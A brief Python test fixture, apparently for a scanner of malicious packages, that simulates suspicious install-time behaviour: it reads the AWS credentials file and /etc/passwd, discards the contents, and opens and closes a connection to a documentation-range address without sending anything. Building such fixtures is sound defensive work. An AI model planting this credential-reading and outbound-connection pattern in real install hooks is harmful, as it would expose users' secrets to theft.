"""Non-destructive fixture that simulates suspicious install-time behavior."""

from pathlib import Path
import socket


for candidate in (
    Path.home() / ".aws" / "credentials",
    Path("/etc/passwd"),
):
    try:
        candidate.read_bytes()
    except (FileNotFoundError, PermissionError, OSError):
        pass

try:
    with socket.create_connection(("203.0.113.10", 443), timeout=1):
        pass
except OSError:
    pass
